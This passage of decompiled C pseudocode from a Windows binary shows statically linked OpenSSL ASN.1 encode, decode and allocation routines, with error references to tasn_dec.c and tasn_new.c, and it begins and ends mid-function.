      if ( v43 && !v43(4, a2, a3, 0) )
        goto LABEL_100;
      if ( *a2 )
      {
        v13 = sub_4456B0(a2, a3);
        if ( v13 >= 0 && v13 < *(_DWORD *)(a3 + 12) )
        {
          v14 = (int *)(*(_DWORD *)(a3 + 8) + 20 * v13);
          v15 = (int *)sub_445920(a2, (int)v14);
          sub_42FE30(v15, v14);
          sub_4456D0(a2, -1, a3);
        }
      }
      else if ( !sub_42FA40(a2, a3) )
      {
        sub_408310(13, 120, 58, (int)"crypto\\asn1\\tasn_dec.c", 214);
        goto LABEL_11;
      }
      v16 = *(_DWORD *)(a3 + 12) <= 0;
      v17 = *(int **)(a3 + 8);
      v40 = *a4;
      v41 = 0;
      if ( v16 )
        goto LABEL_33;
      break;
    case 4:
      return (*(int (__cdecl **)(int *, void **, int, int, int, int, int, _BYTE *))(v42 + 16))(
               a2,
               a4,
               a5,
               a3,
               a1,
               a6,
               a7,
               a8);
    case 5:
      v40 = *a4;
      if ( !sub_42D5D0(0, &v44, &v38, 0, 0, (int *)&v40, a5, -1, 0, 1, (int)a8) )
      {
        sub_408310(13, 120, 58, (int)"crypto\\asn1\\tasn_dec.c", 174);
        goto LABEL_11;
      }
      if ( v38 )
      {
        if ( !(_BYTE)a7 )
        {
          sub_408310(13, 120, 139, (int)"crypto\\asn1\\tasn_dec.c", 183);
          goto LABEL_11;
        }
      }
      else
      {
        if ( (sub_42D2F0((unsigned int)v44) & *(_DWORD *)(a3 + 4)) != 0 )
          return sub_42DC90(a2, a4, v10, a3, 0, 0, a8);
        if ( !(_BYTE)a7 )
        {
          sub_408310(13, 120, 140, (int)"crypto\\asn1\\tasn_dec.c", 191);
          goto LABEL_11;
        }
      }
      return -1;
    default:
      return 0;
  }
  while ( 1 )
  {
    v18 = (int **)sub_445920(a2, (int)v17);
    v19 = sub_42D790(a5, 1, (int)a8, v18, &v40, v17);
    if ( v19 != -1 )
      break;
    v17 += 5;
    v16 = ++v41 < *(_DWORD *)(a3 + 12);
    if ( !v16 )
      goto LABEL_33;
  }
  sub_4456D0(a2, v41, a3);
  if ( v19 <= 0 )
  {
    v20 = v17;
    sub_408310(13, 120, 58, (int)"crypto\\asn1\\tasn_dec.c", 239);
LABEL_41:
    if ( v20 )
    {
      sub_408610(4, "Field=", v20[3], ", Type=", *(_DWORD *)(a3 + 24));
      return 0;
    }
LABEL_11:
    sub_408610(2, "Type=", *(_DWORD *)(a3 + 24));
    return 0;
  }
LABEL_33:
  if ( v41 == *(_DWORD *)(a3 + 12) )
  {
    if ( (_BYTE)a7 )
    {
      sub_42FF10(a2, a3);
      return -1;
    }
    sub_408310(13, 120, 143, (int)"crypto\\asn1\\tasn_dec.c", 251);
    goto LABEL_11;
  }
  if ( v43 && !v43(5, a2, a3, 0) )
  {
LABEL_100:
    sub_408310(13, 120, 100, (int)"crypto\\asn1\\tasn_dec.c", 405);
    goto LABEL_11;
  }
  *a4 = v40;
  return 1;
}
// 42E594: variable 'v31' is possibly undefined

//----- (0042E690) --------------------------------------------------------
int __cdecl sub_42E690(int **a1, _BYTE **a2, int a3, _DWORD *a4, int a5, int a6)
{
  int *v6; // edi
  _DWORD *v8; // esi
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  int *v13; // ebx
  int v14; // eax
  int (*v15)(void); // ecx
  int v16; // eax
  int v17; // ebp
  _BYTE *v18; // ebx
  void (__cdecl *v19)(_DWORD, _DWORD, int); // edx
  _BYTE *v20; // ebx
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // [esp-10h] [ebp-24h]
  char v25; // [esp+7h] [ebp-Dh] BYREF
  _BYTE *v26; // [esp+8h] [ebp-Ch] BYREF
  int v27; // [esp+Ch] [ebp-8h] BYREF
  int **v28; // [esp+10h] [ebp-4h] BYREF

  v6 = (int *)a1;
  if ( !a1 )
    return 0;
  v8 = a4;
  v9 = *a4;
  v10 = *a4 & 0xC0;
  v26 = *a2;
  if ( (v9 & 0x1000) != 0 )
  {
    v28 = a1;
    a1 = (int **)&v28;
    v6 = (int *)&v28;
  }
  if ( (v9 & 6) != 0 )
  {
    if ( (v9 & 8) != 0 )
    {
      v11 = a4[1];
    }
    else
    {
      v10 = 0;
      v11 = (v9 & 2 | 0x20u) >> 1;
    }
    v12 = sub_42D5D0((unsigned int *)&a3, 0, 0, &v25, 0, (int *)&v26, a3, v11, v10, a5, a6);
    if ( !v12 )
    {
      v24 = 536;
LABEL_36:
      sub_408310(13, 131, 58, (int)"crypto\\asn1\\tasn_dec.c", v24);
      return 0;
    }
    if ( v12 != -1 )
    {
      v13 = (int *)*v6;
      if ( *v6 )
      {
        if ( sub_426A30(*v6) > 0 )
        {
          do
          {
            v14 = sub_4269D0(v13);
            v15 = (int (*)(void))v8[4];
            v27 = v14;
            v16 = v15();
            sub_42FF10(&v27, v16);
          }
          while ( sub_426A30((int)v13) > 0 );
        }
      }
      else
      {
        *v6 = (int)sub_426AF0();
      }
      if ( !*v6 )
      {
        sub_408310(13, 131, 65, (int)"crypto\\asn1\\tasn_dec.c", 555);
        return 0;
      }
      v17 = a3;
      if ( a3 > 0 )
      {
        while ( 1 )
        {
          v18 = v26;
          if ( v17 >= 2 && !*v26 && !v26[1] )
            break;
          v19 = (void (__cdecl *)(_DWORD, _DWORD, int))a4[4];
          v27 = 0;
          v19(0, 0, a6);
          if ( !sub_42DFE0(&v26, v17) )
          {
            sub_408310(13, 131, 58, (int)"crypto\\asn1\\tasn_dec.c", 578);
            v21 = ((int (*)(void))a4[4])();
            sub_42FEF0(v27, v21);
            return 0;
          }
          v17 += v18 - v26;
          if ( !sub_4269B0(*a1, v27) )
          {
            sub_408310(13, 131, 65, (int)"crypto\\asn1\\tasn_dec.c", 585);
            v22 = ((int (*)(void))a4[4])();
            sub_42FEF0(v27, v22);
            return 0;
          }
          if ( v17 <= 0 )
            goto LABEL_25;
        }
        v20 = v26 + 2;
        v26 += 2;
        if ( v25 )
          goto LABEL_41;
        sub_408310(13, 131, 159, (int)"crypto\\asn1\\tasn_dec.c", 567);
        return 0;
      }
LABEL_25:
      if ( v25 )
      {
        sub_408310(13, 131, 137, (int)"crypto\\asn1\\tasn_dec.c", 591);
        return 0;
      }
      goto LABEL_40;
    }
    return -1;
  }
  if ( (v9 & 8) != 0 )
  {
    ((void (__cdecl *)(int, int, int))a4[4])(v10, a5, a6);
    v23 = sub_42DFE0(&v26, a3);
    if ( !v23 )
    {
      v24 = 600;
      goto LABEL_36;
    }
  }
  else
  {
    ((void (__cdecl *)(_DWORD, int, int))a4[4])(0, a5, a6);
    v23 = sub_42DFE0(&v26, a3);
    if ( !v23 )
    {
      v24 = 609;
      goto LABEL_36;
    }
  }
  if ( v23 == -1 )
    return -1;
LABEL_40:
  v20 = v26;
LABEL_41:
  *a2 = v20;
  return 1;
}
// 42DFE0: using guessed type int __cdecl sub_42DFE0(_DWORD, _DWORD);

//----- (0042E970) --------------------------------------------------------
int __cdecl sub_42E970(int *a1, void **a2, int a3, int a4, int a5, int a6, int a7, _BYTE *a8)
{
  int result; // eax
  int v9; // ebx

  result = sub_42DFE0(a5, a1, a4, a2, a3, a6, a7, a8);
  v9 = result;
  if ( result <= 0 )
  {
    sub_42FF10(a1, a4);
    return v9;
  }
  return result;
}

//----- (0042E9C0) --------------------------------------------------------
int __cdecl sub_42E9C0(int *a1, void **a2, int a3, int a4)
{
  int *v4; // edi
  int v6; // [esp+8h] [ebp-1Ch] BYREF
  char v7[24]; // [esp+Ch] [ebp-18h] BYREF

  v4 = a1;
  v6 = 0;
  if ( !a1 )
    v4 = &v6;
  v7[0] = 0;
  if ( sub_42DFE0(-1, v4, a4, a2, a3, 0, 0, v7) > 0 )
    return *v4;
  sub_42FF10(v4, a4);
  return 0;
}
// 42E9C0: using guessed type char var_18[24];

//----- (0042EA30) --------------------------------------------------------
int __cdecl sub_42EA30(int *a1, _BYTE **a2, int *a3, int a4, int a5)
{
  int v5; // ecx
  int **v6; // ebx
  int result; // eax
  int v8; // esi
  int v9; // eax
  int v10; // edi
  unsigned int v11; // edi
  int v12; // ebp
  int *v13; // ebx
  signed int v14; // edi
  int v15; // esi
  int v16; // eax
  int v17; // eax
  int v18; // esi
  int v19; // edx
  _BYTE **v20; // ecx
  int v21; // eax
  int v22; // eax
  int v23; // esi
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // [esp-8h] [ebp-38h]
  int v28; // [esp+Ch] [ebp-24h]
  char v29; // [esp+10h] [ebp-20h]
  int v30; // [esp+14h] [ebp-1Ch]
  int v31; // [esp+18h] [ebp-18h]
  int v32; // [esp+1Ch] [ebp-14h]
  char v33; // [esp+20h] [ebp-10h]
  int v34; // [esp+24h] [ebp-Ch]
  int v35; // [esp+24h] [ebp-Ch]
  int *v36; // [esp+28h] [ebp-8h] BYREF
  int v37; // [esp+2Ch] [ebp-4h] BYREF
  int v38; // [esp+44h] [ebp+14h]

  v5 = *a3;
  v34 = *a3;
  if ( (*a3 & 0x1000) != 0 )
  {
    v6 = &v36;
    v36 = a1;
    a1 = (int *)&v36;
  }
  else
  {
    v6 = (int **)a1;
  }
  if ( (v5 & 0x18) != 0 )
  {
    if ( a4 != -1 )
      return -1;
    v8 = a3[1];
    v9 = v5 & 0xC0;
    v28 = v8;
    v29 = v5 & 0xC0;
    goto LABEL_11;
  }
  if ( a4 == -1 )
  {
    v28 = -1;
    v8 = -1;
    v29 = 0;
    v9 = 0;
LABEL_11:
    v10 = a5;
    goto LABEL_12;
  }
  v10 = a5;
  v28 = a4;
  v8 = a4;
  v9 = a5 & 0xC0;
  v29 = a5 & 0xC0;
LABEL_12:
  v11 = v10 & 0xFFFFFF3F;
  v38 = v11;
  if ( (v5 & 0x800) == 0 || (v12 = 2, (v11 & 0x800) == 0) )
    v12 = 1;
  if ( (v5 & 6) == 0 )
  {
    if ( (v5 & 0x10) == 0 )
    {
      v27 = v11 | v9;
      v26 = ((int (*)(void))a3[4])();
      return sub_42F030(v6, a2, v26, v8, v27);
    }
    v22 = ((int (*)(void))a3[4])();
    v23 = sub_42F030(v6, 0, v22, -1, v11);
    if ( v23 )
    {
      v24 = sub_4328B0(v12, v23, v28);
      v30 = v24;
      if ( a2 )
      {
        if ( v24 != -1 )
        {
          sub_432CA0(a2, v12, v23, v28, v29);
          v25 = ((int (*)(void))a3[4])();
          sub_42F030(a1, a2, v25, -1, v11);
          if ( v12 == 2 )
            sub_432890(a2);
        }
      }
      return v30;
    }
    return 0;
  }
  v13 = *v6;
  v14 = 0;
  if ( !v13 )
    return 0;
  if ( (v5 & 2) != 0 )
  {
    v31 = 1;
    if ( (v5 & 4) != 0 )
      v31 = 2;
  }
  else
  {
    v31 = 0;
  }
  if ( v8 == -1 || (v5 & 0x10) != 0 )
  {
    v33 = 0;
    v32 = (v31 != 0) + 16;
  }
  else
  {
    v32 = v8;
    v33 = v9;
  }
  v15 = 0;
  if ( sub_426A30((int)v13) > 0 )
  {
    do
    {
      v37 = sub_426A40(v13, v15);
      v16 = ((int (*)(void))a3[4])();
      v17 = sub_42F030(&v37, 0, v16, -1, v38);
      if ( v17 == -1 || v14 > 0x7FFFFFFF - v17 )
        return -1;
      v14 += v17;
    }
    while ( ++v15 < sub_426A30((int)v13) );
  }
  result = sub_4328B0(v12, v14, v32);
  v18 = result;
  if ( result == -1 )
    return -1;
  v19 = v34 & 0x10;
  v35 = v19;
  if ( v19 )
  {
    result = sub_4328B0(v12, result, v28);
    v19 = v35;
  }
  v30 = result;
  v20 = a2;
  if ( a2 && result != -1 )
  {
    if ( v19 )
    {
      sub_432CA0(a2, v12, v18, v28, v29);
      v20 = a2;
    }
    sub_432CA0(v20, v12, v14, v32, v33);
    v21 = ((int (*)(void))a3[4])();
    sub_42F360(v13, (void **)a2, v14, v21, v31, v38);
    if ( v12 == 2 )
    {
      sub_432890(a2);
      if ( v35 )
      {
        sub_432890(a2);
        return v30;
      }
    }
    return v30;
  }
  return result;
}
// 42F030: using guessed type _DWORD __cdecl sub_42F030(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0042ED50) --------------------------------------------------------
int __cdecl CompareFunction(unsigned __int8 **a1, unsigned __int8 **a2)
{
  signed int v2; // ebx
  signed int v3; // edi
  unsigned int v4; // esi
  unsigned __int8 *v5; // ecx
  unsigned __int8 *v6; // edx
  int v7; // eax
  int result; // eax

  v2 = (signed int)a2[1];
  v3 = (signed int)a1[1];
  v4 = v3;
  if ( v3 >= v2 )
    v4 = (unsigned int)a2[1];
  v5 = *a2;
  v6 = *a1;
  if ( v4 < 4 )
  {
LABEL_6:
    if ( !v4 )
      goto LABEL_15;
  }
  else
  {
    while ( *(_DWORD *)v6 == *(_DWORD *)v5 )
    {
      v4 -= 4;
      v5 += 4;
      v6 += 4;
      if ( v4 < 4 )
        goto LABEL_6;
    }
  }
  v7 = *v6 - *v5;
  if ( v7 )
    goto LABEL_14;
  if ( v4 <= 1 )
    goto LABEL_15;
  v7 = v6[1] - v5[1];
  if ( v7 )
    goto LABEL_14;
  if ( v4 <= 2 )
    goto LABEL_15;
  v7 = v6[2] - v5[2];
  if ( v7 )
  {
LABEL_14:
    result = (v7 >> 31) | 1;
    goto LABEL_16;
  }
  if ( v4 > 3 )
  {
    v7 = v6[3] - v5[3];
    goto LABEL_14;
  }
LABEL_15:
  result = 0;
LABEL_16:
  if ( !result )
    return v3 - v2;
  return result;
}

//----- (0042EDE0) --------------------------------------------------------
int __fastcall sub_42EDE0(int *a1, int a2, int *a3, void *a4)
{
  int *v4; // eax
  int v6; // ecx
  void *v7; // edi
  int (__cdecl *v8)(int *, void *, int *, int); // ecx
  int result; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  char *v13; // ecx
  size_t v14; // esi
  int v15; // eax
  char v16; // [esp+Bh] [ebp-1h] BYREF

  v4 = a3;
  v6 = *(_DWORD *)(a2 + 16);
  v7 = a4;
  if ( v6 )
  {
    v8 = *(int (__cdecl **)(int *, void *, int *, int))(v6 + 24);
    if ( v8 )
      return v8(a3, a4, a1, a2);
  }
  if ( (*(_BYTE *)a2 || *(_DWORD *)(a2 + 4) != 1) && !*a3 )
    return -1;
  if ( *(_BYTE *)a2 == 5 )
  {
    v10 = *(_DWORD *)(*a3 + 4);
    *a1 = v10;
  }
  else if ( *(_DWORD *)(a2 + 4) == -4 )
  {
    v11 = *a3;
    v10 = *(_DWORD *)*a3;
    *a1 = v10;
    v4 = (int *)(v11 + 4);
  }
  else
  {
    v10 = *a1;
  }
  switch ( v10 )
  {
    case 1:
      if ( *v4 == -1 )
        return -1;
      if ( *(_DWORD *)(a2 + 4) != -4 )
      {
        if ( *v4 )
        {
          if ( *(int *)(a2 + 20) > 0 )
            return -1;
        }
        else if ( !*(_DWORD *)(a2 + 20) )
        {
          return -1;
        }
      }
      v16 = *v4;
      v13 = &v16;
      v14 = 1;
      goto LABEL_30;
    case 2:
    case 10:
      return sub_431210(*v4, v7 != 0 ? (char **)&a4 : 0);
    case 3:
      return sub_4376C0(*v4, v7 != 0 ? (_BYTE **)&a4 : 0);
    case 5:
      v13 = 0;
      v14 = 0;
      goto LABEL_30;
    case 6:
      v12 = *v4;
      v13 = *(char **)(v12 + 16);
      v14 = *(_DWORD *)(v12 + 12);
      goto LABEL_30;
    default:
      v15 = *v4;
      if ( *(_DWORD *)(a2 + 20) == 2048 && (*(_BYTE *)(v15 + 12) & 0x10) != 0 )
      {
        if ( v7 )
        {
          *(_DWORD *)(v15 + 8) = v7;
          *(_DWORD *)v15 = 0;
        }
        result = -2;
      }
      else
      {
        v13 = *(char **)(v15 + 8);
        v14 = *(_DWORD *)v15;
LABEL_30:
        if ( v7 )
        {
          if ( v14 )
            memcpy(v7, v13, v14);
        }
        result = v14;
      }
      break;
  }
  return result;
}

//----- (0042EF40) --------------------------------------------------------
int __usercall sub_42EF40@<eax>(int a1@<ebx>, int *a2, void **a3, int a4, char a5)
{
  int v5; // edi
  int v6; // esi
  int v8; // [esp+Ch] [ebp-8h] BYREF
  int v9; // [esp+10h] [ebp-4h]

  v5 = 0;
  v8 = *(_DWORD *)(a1 + 4);
  v6 = sub_42EDE0(&v8, a1, a2, 0);
  if ( v8 == 16 || v8 == 17 || (v9 = 1, v8 == -3) )
    v9 = 0;
  if ( v6 == -1 )
    return 0;
  if ( v6 == -2 )
  {
    v5 = 2;
    v6 = 0;
  }
  if ( a4 == -1 )
    a4 = v8;
  if ( a3 )
  {
    if ( v9 )
      sub_432CA0((_BYTE **)a3, v5, v6, a4, a5);
    sub_42EDE0(&v8, a1, a2, *a3);
    if ( v5 )
      sub_432890((_BYTE **)a3);
    else
      *a3 = (char *)*a3 + v6;
  }
  if ( v9 )
    return sub_4328B0(v5, v6, a4);
  else
    return v6;
}

//----- (0042F030) --------------------------------------------------------
int __cdecl sub_42F030(int *a1, void **a2, int a3, int a4, int a5)
{
  int v5; // ebx
  int v6; // ecx
  int (__cdecl *v7)(int, int *, int, _DWORD); // ebp
  int result; // eax
  int *v9; // eax
  int v10; // eax
  int *v11; // esi
  int *v12; // eax
  void **v13; // esi
  int v14; // eax
  int v15; // ebp
  int *v16; // eax
  int *v17; // esi
  int *v18; // eax
  int v19; // eax
  int v20; // ebp
  int *v21; // eax
  int *v22; // esi
  int *v23; // eax
  int v24; // [esp+Ch] [ebp-10h]
  int v25; // [esp+Ch] [ebp-10h]
  int v26; // [esp+10h] [ebp-Ch]
  int (__cdecl *v27)(int, int *, int, _DWORD); // [esp+14h] [ebp-8h]
  int v28; // [esp+18h] [ebp-4h]

  v5 = a3;
  v6 = *(_DWORD *)(a3 + 16);
  v7 = 0;
  v26 = 1;
  v27 = 0;
  if ( *(_BYTE *)a3 && !*a1 )
    return 0;
  if ( v6 && *(_DWORD *)(v6 + 16) )
  {
    v27 = *(int (__cdecl **)(int, int *, int, _DWORD))(v6 + 16);
    v7 = v27;
  }
  switch ( *(_BYTE *)a3 )
  {
    case 0:
      v9 = *(int **)(a3 + 8);
      if ( v9 )
        return sub_42EA30(a1, (_BYTE **)a2, v9, a4, a5);
      else
        return sub_42EF40(a3, a1, a2, a4, a5);
    case 1:
      goto LABEL_24;
    case 2:
      if ( v7 && !v7(6, a1, a3, 0) )
        return 0;
      v10 = sub_4456B0(a1, v5);
      if ( v10 >= 0 && v10 < *(_DWORD *)(v5 + 12) )
      {
        v11 = (int *)(*(_DWORD *)(v5 + 8) + 20 * v10);
        v12 = (int *)sub_445920(a1, (int)v11);
        return sub_42EA30(v12, (_BYTE **)a2, v11, -1, a5);
      }
      if ( v7 )
        v7(7, a1, v5, 0);
      return 0;
    case 4:
      return (*(int (__cdecl **)(int *, void **, int, int, int))(v6 + 20))(a1, a2, a3, a4, a5);
    case 5:
      return sub_42EF40(a3, a1, a2, -1, a5);
    case 6:
      if ( (a5 & 0x800) != 0 )
        v26 = 2;
LABEL_24:
      v13 = a2;
      v14 = sub_4458B0(&a3, a2, a1, a3);
      if ( v14 < 0 )
        return 0;
      if ( v14 > 0 )
        return a3;
      a3 = 0;
      if ( a4 == -1 )
      {
        a5 &= 0xFFFFFF3F;
        a4 = 16;
      }
      if ( v7 && !v7(6, a1, v5, 0) )
        return 0;
      v15 = *(_DWORD *)(v5 + 8);
      v24 = 0;
      if ( *(int *)(v5 + 12) <= 0 )
      {
LABEL_37:
        result = sub_4328B0(v26, a3, a4);
        v28 = result;
        if ( v13 && result != -1 )
        {
          sub_432CA0((_BYTE **)v13, v26, a3, a4, a5);
          v20 = 0;
          v25 = *(_DWORD *)(v5 + 8);
          if ( *(int *)(v5 + 12) <= 0 )
          {
LABEL_42:
            if ( v26 == 2 )
              sub_432890((_BYTE **)a2);
            if ( !v27 || v27(7, a1, v5, 0) )
              return v28;
          }
          else
          {
            while ( 1 )
            {
              v21 = sub_445930(a1, v25, 1);
              v22 = v21;
              if ( !v21 )
                break;
              v23 = (int *)sub_445920(a1, (int)v21);
              sub_42EA30(v23, (_BYTE **)a2, v22, -1, a5);
              v25 += 20;
              if ( ++v20 >= *(_DWORD *)(v5 + 12) )
                goto LABEL_42;
            }
          }
          return 0;
        }
      }
      else
      {
        while ( 1 )
        {
          v16 = sub_445930(a1, v15, 1);
          v17 = v16;
          if ( !v16 )
            return 0;
          v18 = (int *)sub_445920(a1, (int)v16);
          v19 = sub_42EA30(v18, 0, v17, -1, a5);
          if ( v19 == -1 || v19 > 0x7FFFFFFF - a3 )
            return -1;
          a3 += v19;
          v15 += 20;
          if ( ++v24 >= *(_DWORD *)(v5 + 12) )
          {
            v13 = a2;
            goto LABEL_37;
          }
        }
      }
      return result;
    default:
      return 0;
  }
}

//----- (0042F360) --------------------------------------------------------
int __cdecl sub_42F360(int *a1, void **a2, size_t Size, int a4, int a5, int a6)
{
  int v6; // ebx
  int v7; // eax
  size_t *v8; // ebp
  void *v9; // eax
  int v11; // edi
  _DWORD *v12; // edi
  int v13; // eax
  int v14; // ebx
  size_t *v15; // edi
  int v16; // edi
  int *v17; // ebx
  void *v18; // [esp+10h] [ebp-10h] BYREF
  int v19; // [esp+14h] [ebp-Ch] BYREF
  size_t *v20; // [esp+18h] [ebp-8h]
  void *Block; // [esp+1Ch] [ebp-4h]

  v6 = 0;
  v18 = 0;
  if ( a5 && sub_426A30((int)a1) >= 2 )
  {
    v7 = sub_426A30((int)a1);
    v8 = (size_t *)sub_4133F0(12 * v7);
    v20 = v8;
    if ( !v8 )
      return 0;
    v9 = sub_4133F0(Size);
    Block = v9;
    if ( !v9 )
    {
      sub_413490(v8);
      return 0;
    }
    v18 = v9;
    if ( sub_426A30((int)a1) > 0 )
    {
      v12 = v8 + 2;
      do
      {
        v19 = sub_426A40(a1, v6);
        *(v12 - 2) = v18;
        *(v12 - 1) = sub_42F030(&v19, &v18, a4, -1, a6);
        *v12 = v19;
        ++v6;
        v12 += 3;
      }
      while ( v6 < sub_426A30((int)a1) );
      v8 = v20;
    }
    v13 = sub_426A30((int)a1);
    qsort(v8, v13, 0xCu, (_CoreCrtNonSecureSearchSortCompareFunction)CompareFunction);
    v18 = *a2;
    v14 = 0;
    if ( sub_426A30((int)a1) > 0 )
    {
      v15 = v8 + 1;
      do
      {
        memcpy(v18, (const void *)*(v15 - 1), *v15);
        v18 = (char *)v18 + *v15;
        ++v14;
        v15 += 3;
      }
      while ( v14 < sub_426A30((int)a1) );
    }
    *a2 = v18;
    if ( a5 == 2 )
    {
      v16 = 0;
      if ( sub_426A30((int)a1) > 0 )
      {
        v17 = (int *)(v8 + 2);
        do
        {
          sub_426A60(a1, v16++, *v17);
          v17 += 3;
        }
        while ( v16 < sub_426A30((int)a1) );
      }
    }
    sub_413490(v8);
    sub_413490(Block);
    return 1;
  }
  v11 = 0;
  if ( sub_426A30((int)a1) <= 0 )
    return 1;
  do
  {
    v19 = sub_426A40(a1, v11);
    sub_42F030(&v19, a2, a4, -1, a6);
    ++v11;
  }
  while ( v11 < sub_426A30((int)a1) );
  return 1;
}
// 42F030: using guessed type _DWORD __cdecl sub_42F030(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0042F580) --------------------------------------------------------
signed int __usercall sub_42F580@<eax>(int a1@<ebx>, int a2, void **a3, int a4)
{
  int v4; // ebp
  signed int result; // eax
  signed int v6; // esi
  void *v7; // eax
  void *v8; // edi
  void *v9; // [esp+4h] [ebp-4h] BYREF

  v4 = a4;
  if ( !a3 || *a3 )
    return sub_42F030(&a2, a3, a4, -1, a1);
  result = sub_42F030(&a2, 0, a4, -1, a1);
  v6 = result;
  if ( result > 0 )
  {
    v7 = sub_4133F0(result);
    v8 = v7;
    if ( v7 )
    {
      v9 = v7;
      sub_42F030(&a2, &v9, v4, -1, a1);
      *a3 = v8;
      return v6;
    }
    else
    {
      return -1;
    }
  }
  return result;
}

//----- (0042F620) --------------------------------------------------------
signed int __cdecl sub_42F620(int a1, void **a2, int a3)
{
  return sub_42F580(0, a1, a2, a3);
}

//----- (0042F640) --------------------------------------------------------
int __usercall sub_42F640@<eax>(int a1@<edi>, char ***a2@<esi>, int a3)
{
  int result; // eax
  int v4; // eax
  int (__cdecl *v5)(char ***, int); // eax
  int v6; // edx
  char **v7; // eax
  char **v8; // eax

  if ( !a1 )
    return 0;
  v4 = *(_DWORD *)(a1 + 16);
  if ( v4 )
  {
    v5 = *(int (__cdecl **)(char ***, int))(v4 + 8);
    if ( v5 )
      return v5(a2, a1);
  }
  if ( *(_BYTE *)a1 == 5 )
    v6 = -1;
  else
    v6 = *(_DWORD *)(a1 + 4);
  switch ( v6 )
  {
    case -4:
      v7 = (char **)sub_4133F0(8u);
      if ( !v7 )
        return 0;
      v7[1] = 0;
      *v7 = (char *)-1;
      *a2 = v7;
      result = *a2 != 0;
      break;
    case 1:
      *a2 = *(char ***)(a1 + 20);
      result = 1;
      break;
    case 5:
      *a2 = (char **)1;
      result = 1;
      break;
    case 6:
      *a2 = sub_423310(0);
      result = 1;
      break;
    default:
      if ( a3 )
      {
        v8 = *a2;
        *v8 = 0;
        v8[2] = 0;
        v8[1] = (char *)v6;
        v8[3] = (char *)128;
      }
      else
      {
        v8 = (char **)sub_4329F0(v6);
        *a2 = v8;
      }
      if ( *(_BYTE *)a1 == 5 )
      {
        if ( v8 )
          v8[3] = (char *)((unsigned int)v8[3] | 0x40);
      }
      result = *a2 != 0;
      break;
  }
  return result;
}

//----- (0042F780) --------------------------------------------------------
int __fastcall sub_42F780(int a1, int *a2, int a3)
{
  int v4; // eax
  int v5; // ebp
  int (__cdecl *v7)(int, int *, int, _DWORD); // ebx
  int (__cdecl *v8)(int *, int); // eax
  int v9; // eax
  int v11; // eax
  void *v12; // eax
  int v13; // eax
  void *v14; // eax
  int *v15; // ebx
  int *v16; // eax
  int (__cdecl *v17)(int, int *, int, _DWORD); // [esp+10h] [ebp-4h]

  v4 = *(_DWORD *)(a1 + 16);
  v5 = 0;
  if ( v4 && (v7 = *(int (__cdecl **)(int, int *, int, _DWORD))(v4 + 16)) != 0 )
  {
    v17 = *(int (__cdecl **)(int, int *, int, _DWORD))(v4 + 16);
  }
  else
  {
    v17 = 0;
    v7 = 0;
  }
  switch ( *(_BYTE *)a1 )
  {
    case 0:
      if ( !*(_DWORD *)(a1 + 8) )
        goto LABEL_13;
      v9 = sub_42FA60(a2, *(int **)(a1 + 8));
      goto LABEL_9;
    case 1:
    case 6:
      if ( !v7 )
        goto LABEL_26;
      v13 = v7(0, a2, a1, 0);
      if ( !v13 )
        goto LABEL_35;
      if ( v13 == 2 )
        return 1;
LABEL_26:
      if ( a3 )
      {
        memset((void *)*a2, 0, *(_DWORD *)(a1 + 20));
      }
      else
      {
        v14 = sub_413430(*(_DWORD *)(a1 + 20));
        *a2 = (int)v14;
        if ( !v14 )
          goto LABEL_36;
      }
      if ( sub_4456F0(a2, 0, a1) < 0 )
        goto LABEL_36;
      sub_445790(a2, a1);
      v15 = *(int **)(a1 + 8);
      if ( *(int *)(a1 + 12) <= 0 )
        goto LABEL_33;
      break;
    case 2:
      if ( !v7 )
        goto LABEL_17;
      v11 = v7(0, a2, a1, 0);
      if ( !v11 )
        goto LABEL_35;
      if ( v11 == 2 )
        return 1;
LABEL_17:
      if ( a3 )
      {
        memset((void *)*a2, 0, *(_DWORD *)(a1 + 20));
      }
      else
      {
        v12 = sub_413430(*(_DWORD *)(a1 + 20));
        *a2 = (int)v12;
        if ( !v12 )
          goto LABEL_36;
      }
      sub_4456D0(a2, -1, a1);
      if ( !v7 )
        return 1;
      if ( !v7(1, a2, a1, 0) )
        goto LABEL_35;
      return 1;
    case 4:
      if ( !v4 )
        return 1;
      v8 = *(int (__cdecl **)(int *, int))(v4 + 4);
      if ( !v8 )
        return 1;
      v9 = v8(a2, a1);
LABEL_9:
      if ( v9 )
        return 1;
      goto LABEL_36;
    case 5:
LABEL_13:
      v9 = sub_42F640(a1, (char ***)a2, a3);
      goto LABEL_9;
    default:
      return 1;
  }
  do
  {
    v16 = (int *)sub_445920(a2, (int)v15);
    if ( !sub_42FA60(v16, v15) )
    {
LABEL_36:
      sub_408310(13, 121, 65, (int)"crypto\\asn1\\tasn_new.c", 145);
      return 0;
    }
    ++v5;
    v15 += 5;
  }
  while ( v5 < *(_DWORD *)(a1 + 12) );
LABEL_33:
  if ( !v17 || v17(1, a2, a1, 0) )
    return 1;
LABEL_35:
  sub_408310(13, 121, 100, (int)"crypto\\asn1\\tasn_new.c", 152);
  sub_42FF10(a2, a1);
  return 0;
}

//----- (0042F9B0) --------------------------------------------------------
char *__usercall sub_42F9B0@<eax>(_DWORD *a1@<esi>, char *a2)
{
  int v2; // ecx
  int (__cdecl *v3)(_DWORD *, char *); // ecx
  char *result; // eax
  unsigned int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int (__cdecl *v8)(_DWORD *, char *); // ecx
  _DWORD *v9; // edx
  char *v10; // [esp+4h] [ebp+4h]

  result = a2;
  v5 = *a2;
  while ( 2 )
  {
    switch ( v5 )
    {
      case 0u:
        v6 = *((_DWORD *)result + 2);
        if ( !v6 )
        {
          v10 = result;
          v9 = a1;
          goto LABEL_13;
        }
        if ( (*(_DWORD *)v6 & 0x306) != 0 )
          goto LABEL_12;
        result = (char *)(*(int (**)(void))(v6 + 16))();
        v5 = *result;
        if ( v5 <= 6 )
          continue;
        return result;
      case 1u:
      case 2u:
      case 6u:
        goto LABEL_12;
      case 4u:
        v7 = *((_DWORD *)result + 4);
        if ( v7 )
        {
          v8 = *(int (__cdecl **)(_DWORD *, char *))(v7 + 12);
          if ( v8 )
            return (char *)v8(a1, result);
        }
LABEL_12:
        *a1 = 0;
        return result;
      case 5u:
        v10 = result;
        v9 = a1;
LABEL_13:
        result = v10;
        if ( !v10 )
          goto LABEL_20;
